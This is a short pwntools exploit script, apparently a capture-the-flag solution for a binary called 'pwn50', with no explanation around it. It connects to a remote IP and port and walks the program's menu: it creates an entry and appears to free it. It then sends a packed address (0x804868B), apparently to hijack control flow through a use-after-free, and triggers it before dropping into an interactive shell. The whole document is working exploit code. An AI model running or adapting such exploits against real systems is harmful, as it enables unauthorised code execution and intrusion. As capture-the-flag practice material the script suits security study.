from pwn import *

#s = process("./pwn50")
s = remote("139.59.61.220", 12345)

s.recvuntil("Enter your choice:")
s.sendline("1")
s.recvuntil(":")
s.sendline("abcd")
s.recvuntil(":")
s.sendline("DEFG")


s.recvuntil("Enter your choice:")
s.sendline("4")

s.recvuntil("Enter your choice:")
s.sendline("2")
s.sendline(p32(0x804868B))

s.sendline("3")
s.interactive()
